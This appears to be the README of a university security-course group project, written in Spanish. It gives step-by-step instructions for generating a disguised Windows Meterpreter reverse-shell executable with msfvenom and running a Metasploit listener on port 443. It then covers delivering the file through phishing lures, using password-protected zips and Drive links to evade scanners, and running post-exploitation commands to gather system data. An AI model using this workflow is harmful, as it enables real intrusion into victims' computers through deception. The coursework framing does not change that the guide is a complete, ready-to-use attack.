# Proyecto Grupo 4 - Generación de Payload con Evasión de Antivirus

Este proyecto demuestra cómo generar un archivo malicioso usando Metasploit, enviárselo a una víctima mediante técnicas de ingeniería social, y obtener información del sistema comprometido. Todo el trabajo se realiza desde Kali Linux.

---

## Requisitos

Tener Kali Linux instalado. Si usas la configuración del grupo, abre el archivo KaliLinux.exe que lanza Kali en pantalla completa automáticamente.

Dentro de Kali, instalar Metasploit si no viene incluido:

```
sudo apt-get update
sudo apt-get install metasploit-framework
```

---

## Paso 1 - Conocer tu IP

Antes de generar el payload necesitas saber cuál es tu IP en la red. Ejecuta este comando en la terminal de Kali:

```
ip a
```

Busca la interfaz que dice eth0 o algo parecido y anota el número que aparece después de inet. Ese número es tu LHOST, que es la dirección a la que se va a conectar la víctima cuando abra el archivo.

Si la víctima está fuera de tu red local, necesitas tu IP pública. La puedes ver con:

```
curl ifconfig.me
```

---

## Paso 2 - Generar el payload

Ejecuta el script que viene en el repositorio. El script te muestra tu IP, te pregunta cuál usar y genera el archivo automáticamente:

```
bash generar_payload.sh
```

Si prefieres correr el comando tú mismo a mano, es este:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o actualizacion_sistema.exe
```

Lo que hace cada parte del comando:

`msfvenom` es la herramienta de Metasploit que se encarga de crear los payloads.

`-p windows/x64/meterpreter/reverse_https` define el tipo de conexión que va a hacer el archivo cuando alguien lo abra. La palabra reverse significa que la víctima es la que llama a tu computadora, no al revés. El HTTPS hace que el tráfico parezca navegación web normal, por eso los antivirus no lo bloquean de inmediato.

`LHOST` es tu IP, o sea la dirección a la que se conecta la víctima.

`LPORT 443` es el puerto que se usa. El 443 es el puerto estándar de HTTPS, ningún firewall lo bloquea porque es el mismo que usan todas las páginas web seguras.

`-f exe` le dice a msfvenom que el archivo final sea un ejecutable de Windows.

`-o actualizacion_sistema.exe` es el nombre con el que se guarda el archivo que se genera.

---

## Paso 3 - Configurar el listener

El listener es el proceso que se queda escuchando en tu computadora esperando que la víctima abra el archivo. Tienes dos formas de iniciarlo.

Forma automática usando el script incluido:

```
msfconsole -r listener.rc
```

Forma manual escribiendo cada comando dentro de msfconsole:

```
msfconsole
```

Una vez que carga, escribes estos comandos uno por uno:

```
use exploit/multi/handler
```

Esto selecciona el módulo que recibe conexiones entrantes.

```
set payload windows/x64/meterpreter/reverse_https
```

Define qué tipo de conexión vas a recibir. Tiene que coincidir exactamente con lo que pusiste al generar el payload.

```
set LHOST 0.0.0.0
```

El 0.0.0.0 significa que acepta conexiones en cualquier interfaz de red de tu máquina.

```
set LPORT 443
```

El mismo puerto que usaste al generar el payload.

```
set ExitOnSession false
```

Esto hace que el listener siga activo después de recibir una conexión, por si hay más de una víctima en la demo.

```
run
```

Inicia el listener. A partir de este momento tu computadora está esperando la conexión.

---

## Paso 4 - Enviar el archivo a la víctima

El archivo generado tiene que llegarle a la víctima de forma convincente para que lo ejecute.

Por correo electrónico: comprimes el archivo en un zip con contraseña para que el escáner del servidor de correo no lo analice. En el cuerpo del correo pones la contraseña. El asunto puede ser algo como "Actualización pendiente del sistema" o "Documento del proyecto compartido".

```
zip -e actualizacion_protegida.zip actualizacion_sistema.exe
```

Por red social o mensajería: subes el archivo a Google Drive y mandas el link. Google Drive no escanea el contenido de ejecutables, solo documentos de Office y PDFs.

---

## Paso 5 - Obtener la información del sistema

Cuando la víctima ejecuta el archivo, en tu terminal aparece este mensaje:

```
[*] Meterpreter session 1 opened
```

Eso significa que ya tienes acceso. Ahora ejecutas los comandos para obtener la información que pide el proyecto.

Información general del sistema:

```
sysinfo
```

Este comando muestra el nombre del equipo, el sistema operativo con su versión, la arquitectura del procesador y el idioma del sistema.

Nombre del usuario actual y su SID:

```
getuid
```

Muestra quién está usando la computadora en ese momento. El SID es el identificador único del usuario dentro del sistema Windows.

Para obtener el SID completo:

```
run post/windows/gather/enum_system
```

Este módulo recopila toda la información del sistema de una vez, incluyendo el SID, los usuarios del equipo, los grupos y la configuración de red.

Listado del directorio actual:

```
shell
dir
```

Con shell abres una terminal de Windows dentro de la sesión. Con dir ves los archivos y carpetas del directorio donde está parado el usuario en ese momento.

---

## Estructura del repositorio

```
grupo4-seguridad/
    README.md                 explicación completa del proyecto
    generar_payload.sh        script que genera el payload pidiendo la IP
    listener.rc               script que configura el handler automáticamente
    capturas/                 carpeta donde van las screenshots para el reporte
```

---

## Información del grupo

Proyecto de la materia de Seguridad Informática.

Integrantes: Cossio Brenda, López Quezada Lisman, Guerra Acosta Cristian.

Tarea asignada: Generar un archivo malicioso que será enviado a la víctima vía correo electrónico o red social. El archivo debe ser confeccionado de forma que sea creíble e invite a la víctima a ejecutarlo. La información mínima a obtener del equipo víctima es la siguiente: información del sistema, SID, nombre del usuario actual y listado del directorio actual.
